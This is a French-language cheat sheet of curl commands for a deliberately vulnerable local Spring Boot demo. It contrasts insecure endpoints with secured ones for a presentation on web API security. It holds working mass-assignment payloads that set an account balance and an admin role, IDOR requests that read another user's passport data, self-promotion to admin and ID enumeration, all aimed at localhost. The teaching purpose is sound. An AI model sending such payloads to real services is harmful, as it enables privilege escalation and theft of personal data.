# 🧪 Commandes de test - Copier/Coller

## ✅ Vérification de l'application

# Test de base
curl http://localhost:8080/test

# Informations
curl http://localhost:8080/test/info


## ❌ Tests VULNÉRABLES

# 1. Mass Assignment Attack - Modifier le solde et les rôles
curl -X PUT http://localhost:8080/vulnerable/users/1 \
  -H "Content-Type: application/json" \
  -d '{
    "id": 1,
    "email": "user@example.com",
    "firstName": "John",
    "lastName": "Doe",
    "accountBalance": 999999.99,
    "roles": [{"id": 2, "name": "ROLE_ADMIN"}]
  }'

# Vérifier que ça a marché
curl http://localhost:8080/vulnerable/users/1


# 2. IDOR - Accéder aux données d'Alice
curl http://localhost:8080/vulnerable/users/3


# 3. Lister tous les utilisateurs (devrait être admin only)
curl http://localhost:8080/vulnerable/users/all


# 4. Se promouvoir en admin
curl -X POST http://localhost:8080/vulnerable/users/1/promote


# 5. Énumération d'IDs
for i in {1..5}; do
  echo "Testing ID $i:"
  curl http://localhost:8080/vulnerable/users/exists/$i
  echo ""
done


## ✅ Tests SÉCURISÉS

# 1. Tentative Mass Assignment (sera bloqué)
curl -X PUT http://localhost:8080/secure/users/1 \
  -u user@example.com:password123 \
  -H "Content-Type: application/json" \
  -d '{
    "firstName": "John",
    "lastName": "Doe",
    "email": "user@example.com",
    "phoneNumber": "+33612345678",
    "accountBalance": 999999.99,
    "roles": [{"name": "ROLE_ADMIN"}]
  }'

# Vérifier que accountBalance et roles n'ont PAS changé
curl http://localhost:8080/secure/users/1 \
  -u user@example.com:password123


# 2. Tentative IDOR (sera bloqué)
curl http://localhost:8080/secure/users/3 \
  -u user@example.com:password123


# 3. Accès à son propre profil (autorisé)
curl http://localhost:8080/secure/users/1 \
  -u user@example.com:password123


# 4. Endpoint /me (recommandé pour éviter IDOR)
curl http://localhost:8080/secure/users/me \
  -u user@example.com:password123


# 5. User essaie de lister tous les users (sera bloqué)
curl http://localhost:8080/secure/users/all \
  -u user@example.com:password123


# 6. Admin liste tous les users (autorisé)
curl http://localhost:8080/secure/users/all \
  -u admin@example.com:admin123


# 7. User essaie de promouvoir quelqu'un (sera bloqué)
curl -X POST http://localhost:8080/secure/users/3/promote \
  -u user@example.com:password123


# 8. Admin promeut un utilisateur (autorisé)
curl -X POST http://localhost:8080/secure/users/1/promote \
  -u admin@example.com:admin123


# 9. Accès sans authentification (sera bloqué)
curl http://localhost:8080/secure/users/1


## 🎯 Tests de validation pour la présentation

# Démonstration 1 : Mass Assignment
echo "=== DÉMONSTRATION MASS ASSIGNMENT ==="
echo "1. État initial de User 1:"
curl http://localhost:8080/vulnerable/users/1 | jq '.accountBalance, .roles'

echo "\n2. Attaque Mass Assignment:"
curl -X PUT http://localhost:8080/vulnerable/users/1 \
  -H "Content-Type: application/json" \
  -d '{"accountBalance": 999999, "roles": [{"name": "ROLE_ADMIN"}]}' \
  | jq .

echo "\n3. Vérification - Le solde et les rôles ont changé !"
curl http://localhost:8080/vulnerable/users/1 | jq '.accountBalance, .roles'


# Démonstration 2 : IDOR
echo "\n=== DÉMONSTRATION IDOR ==="
echo "User 1 (John) essaie d'accéder aux données d'Alice (User 3):"
curl http://localhost:8080/vulnerable/users/3 | jq '.firstName, .email, .passportNumber'


# Démonstration 3 : Protection avec endpoints sécurisés
echo "\n=== DÉMONSTRATION PROTECTIONS ==="
echo "User 1 essaie IDOR sur endpoint sécurisé:"
curl http://localhost:8080/secure/users/3 \
  -u user@example.com:password123 \
  | jq .


## 📝 Commandes avec jq (pour formater le JSON)

# Si jq n'est pas installé, l'installer :
# macOS: brew install jq
# Linux: sudo apt-get install jq
# Windows: choco install jq

# Avec jq, les résultats sont plus lisibles :
curl http://localhost:8080/vulnerable/users/1 | jq .


## 🔍 Monitoring des logs

# Dans un terminal séparé, suivre les logs de l'application :
tail -f logs/application.log

# Ou si lancé avec mvn spring-boot:run, les logs apparaissent directement


## 🌐 Accès à la console H2

# Ouvrir dans un navigateur :
# http://localhost:8080/h2-console

# Credentials :
# JDBC URL: jdbc:h2:mem:testdb
# Username: sa
# Password: (laisser vide)

# Requêtes SQL à tester :
SELECT * FROM users;
SELECT * FROM roles;
SELECT * FROM user_roles;
